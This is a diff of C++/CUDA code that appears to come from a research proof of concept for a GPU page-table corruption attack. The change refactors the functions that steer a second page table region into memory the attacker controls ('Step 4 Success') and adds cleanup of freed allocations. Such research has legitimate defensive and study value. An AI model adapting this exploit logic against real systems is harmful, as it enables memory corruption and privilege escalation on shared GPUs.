@@ -16,18 +16,22 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
                   double threshold, uint64_t skip)
 {
   uint8_t *temp;
-  uint8_t **region_ptrs;
-  uint8_t *agg_ptr, *corrupted_ptr, *victim_ptr;
-  uint64_t out_corrupt_id, out_victim_id;
+  GPUBreachContext ctx;
   if (!first_PT_region_attack (num_alloc_init, num_alloc_post_msg, threshold,
-                               skip, &region_ptrs, &agg_ptr, &corrupted_ptr,
-                               &victim_ptr, &out_corrupt_id, &out_victim_id))
+                               skip, ctx))
     {
       printf ("Error: First PTC Allocation is wrong\n");
       exit (1);
     }
 
-  std::cout << out_corrupt_id << " " << out_victim_id << '\n';
+  auto& region_ptrs = ctx.step3_data.region_ptrs;
+  auto& agg_ptrs = ctx.step3_data.agg_ptrs;
+  auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
+  auto& victim_ptr = ctx.step3_data.victim_ptr;
+  auto& corrupted_id = ctx.step3_data.corrupted_id;
+  auto& victim_id = ctx.step3_data.victim_id;
+
+  std::cout << corrupted_id << " " << victim_id << '\n';
   std::cout << "Ready to Start Second PTC Test " << '\n';
   pause ();
 
@@ -37,7 +41,7 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
     {
       // Create free space for Page Table Region
       if (i == next_id)
-        evict_from_device (region_ptrs[out_victim_id], ALLOC_SIZE);
+        evict_from_device (region_ptrs[victim_id], ALLOC_SIZE);
 
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
@@ -57,6 +61,8 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
   std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
                "Region: Press \033[1;32mEnter Key\033[0m to continue..."
             << '\n';
+  for (auto ptr : agg_ptrs)
+    cudaFree(ptr);
   pause ();
 
   std::cout << "ok"
@@ -73,7 +79,7 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
     }
   for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
   {
-    if (i != out_corrupt_id && i != out_victim_id)
+    if (i != corrupted_id && i != victim_id)
       cudaFree(region_ptrs[i]);
     gpuErrchk(cudaPeekAtLastError());
   }
